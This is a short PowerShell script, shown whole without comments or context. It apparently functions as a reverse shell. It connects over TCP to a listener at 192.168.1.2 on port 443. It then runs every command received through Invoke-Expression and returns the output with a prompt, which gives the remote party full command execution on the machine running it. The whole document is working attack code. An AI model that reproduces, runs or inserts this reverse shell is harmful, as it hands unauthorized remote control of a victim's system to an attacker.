$client = New-Object System.Net.Sockets.TCPClient("192.168.1.2",443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

$sendback2 = 'PS ' + (pwd).Path + '> '
$enc = [system.Text.Encoding]::ASCII
$sendbyte = $enc.GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()

while ($true) {
  $i = $stream.Read($bytes, 0, $bytes.Length)
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  if ([string]::IsNullOrEmpty($data)) { exit }
  $sendback = ((iex $data) 2>&1 | Out-String )
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $enc = [system.Text.Encoding]::ASCII
  $sendbyte = $enc.GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()

